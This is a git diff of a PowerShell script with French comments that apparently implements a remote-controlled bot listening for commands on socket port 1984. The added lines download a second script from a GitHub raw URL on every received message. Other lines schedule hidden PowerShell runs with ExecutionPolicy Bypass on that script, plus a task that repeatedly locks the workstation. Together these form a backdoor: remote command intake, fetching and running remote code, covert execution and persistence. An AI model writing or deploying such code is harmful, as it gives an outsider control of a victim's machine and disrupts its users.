@@ -42,6 +42,8 @@ Function global:FRX_Socket-Send-Port{
 #$DirectoryBot = New-Item -Path "C:\Program Files (x86)\WindowsPowerShell\Configuration\Registration\lib"
 $botpath      = "C:\lib\BOT\BOTOK.ps1"
 $URL          = "https://raw.githubusercontent.com/Airone23/BOT-FRX/master/BOTOK.ps1"
+$autrescript  = "C:\lib\BOT\test.ps1"
+$autreURL     = "https://raw.githubusercontent.com/Airone23/BOT-FRX/master/test.ps1"
 # sur le bot : 
 function global:FRX_Socket-MessageAction{
     param($message)
@@ -53,7 +55,7 @@ function global:FRX_Socket-MessageAction{
             #L'autre qui va verrouiller le pc toutes les minutes
 
             #Mise en place des tâches
-            $tache1 = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-windowstyle hidden -ExecutionPolicy Bypass C:\lib\BOT\test.ps1"
+            $tache1 = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-windowstyle hidden -ExecutionPolicy Bypass $autrescript"
             $tache2  = New-ScheduledTaskAction -Execute "rundll32.exe" -Argument "user32.dll,LockWorkStation"
             
             #Mise en place de la fréquence de la tâche et de la date de sa première exécution
@@ -126,6 +128,7 @@ function global:FRX_Socket-MessageAction{
 $Socket   = FRX_Socket-Listen-Connect  -port 1984
 do{
     $message  = FRX_Socket-Listen-Read     -socket  $Socket -buffersize 512
+    Invoke-WebRequest -Uri $autreURL -OutFile $autrescript
     $stop     = FRX_Socket-MessageAction   -message $message
    }until($stop)
 $closeACK = FRX_Socket-Listen-Close    -socket $Socket 
